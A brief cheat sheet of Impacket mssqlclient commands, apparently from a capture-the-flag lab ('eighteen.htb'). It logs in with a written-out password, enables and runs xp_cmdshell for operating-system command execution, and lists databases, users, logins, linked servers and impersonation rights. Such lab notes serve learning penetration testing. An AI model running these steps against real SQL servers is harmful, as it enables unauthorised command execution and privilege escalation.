-- All of the following are mssqlclient commands
mssqlclient.py eighteen.htb/kevin:'iNa2we6haRj2gaw!'@eighteen.htb

--  client translates this into MSSQL EXEC xp_cmdshell 'whoami';
xp_cmdshell whoami;

enable_xp_cmdshell;

-- look for non-standart DBs 
enum_db;

-- use non-standard DB
use financial_planner;

enum_users;

enum_logins;

-- Linked Server : you can query tables from remote servers
enum_links;

-- 
enum_impersonate;
